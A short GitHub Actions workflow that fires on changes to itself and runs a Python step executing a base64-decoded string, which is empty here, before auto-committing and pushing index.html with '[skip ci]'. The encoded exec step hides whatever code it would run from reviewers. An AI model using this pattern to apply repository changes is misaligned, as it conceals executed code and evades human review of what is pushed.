name: Update candidate fields

on:
  push:
    paths:
      - .github/workflows/update-candidate-fields.yml

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply requested form changes
        run: python -c "import base64; exec(base64.b64decode('').decode())"
      - name: Commit changes
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add index.html
          git commit -m "Update candidate fields and systems [skip ci]"
          git push

# trigger
